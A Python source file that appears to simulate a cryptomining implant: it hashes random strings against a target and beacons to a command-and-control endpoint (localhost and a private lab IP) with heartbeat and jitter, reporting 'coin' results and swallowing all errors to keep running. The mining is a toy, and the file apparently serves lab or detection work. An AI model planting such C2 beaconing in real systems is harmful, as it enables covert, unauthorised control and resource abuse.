import uuid
import datetime
import hashlib
import string
import time
import requests
import json
import logging
from random import *

#below value should be 0 (CPU @ ~20%) or 1 (CPU quiet, slows payoff)
processingLevel = 0

target = 3000000000000000000000000000000000000000000000  #just for testing
#targetDigest = 00045a5623a9ad5c610e2c7dfb024fa8a798f52d
#targetDigest = 00000042e58e31cd58e2fa8cb55cfa0f9f0d51f5

class PhoneHome():
    heartbeat = 30
    jitter = 15
    home_url = 'http://localhost:8888/kk'
    # home_url = 'http://192.168.37.129:8888/kk'

    def __init__(self):
        super().__init__()

    def CallHome(self, MinerID):    #heartbeat check-in with C2
        payload = { 'c' : "BCH", 'm' : MinerID }
        r = requests.get(self.home_url, data=payload)
        if r.status_code != 200: raise ValueError(r.text)
        p = json.loads(r.text)
        PhoneHome.heartbeat = p["h"]
        PhoneHome.jitter = p["j"]

    def CallCoin(self, CoinResult, MinerID):    #send a coin result to bank
        payload = { 'c' : "CCH", 'm' : MinerID, 'k' : CoinResult }
        r = requests.get(self.home_url, data=payload)

    def NewTime(self):    #get the next C2 check-in time
        current_time = datetime.datetime.now()
        #add or subtract jitter
        seed = randint(0,1)
        if seed == 0:
            offset = PhoneHome.heartbeat - randint(0, PhoneHome.jitter)
        else:
            offset = PhoneHome.heartbeat + randint(0, PhoneHome.jitter)
        #use offset to establish next check in
        return_time = (current_time + datetime.timedelta(seconds = offset))
        return (return_time)

class Coin():
    def __init__(self):
        super().__init__()

    def Mine(self):    #generate a random string and get its hash digest
        allchar = string.ascii_letters + string.punctuation + string.digits
        miningSeed = "".join(choice(allchar) for x in range(randint(1, 20)))
        miningDigest=hashlib.sha1((miningSeed).encode('utf-8'))
        time.sleep(processingLevel)
        return (miningDigest)

    def Compare(self, target, miningDigest):    #compare mining try to reference value
        CoinTry=int(miningDigest.hexdigest(),miningDigest.digest_size)
        if CoinTry < target:
            result = 1
        else:
            result = 0
        return (result)


def main():
    GetNewParams = 1
    app=PhoneHome()
    Mine=Coin()
    MinerID = uuid.uuid4().hex

    while True:
        try:
            checkpoint = datetime.datetime.now()

            if GetNewParams == 1:
                check_in = app.NewTime()
                GetNewParams = 0
                app.CallHome(MinerID)

            if checkpoint > check_in:
                GetNewParams = 1
            else:
                CoinResult = Mine.Mine()

            if Mine.Compare(target,CoinResult) == 1:
                app.CallCoin(CoinResult.hexdigest(),MinerID)

        except (KeyboardInterrupt):                 #REMOVE IN FINAL
            break                                   #REMOVE IN FINAL
        except:
            continue

if __name__ == "__main__":
    main()
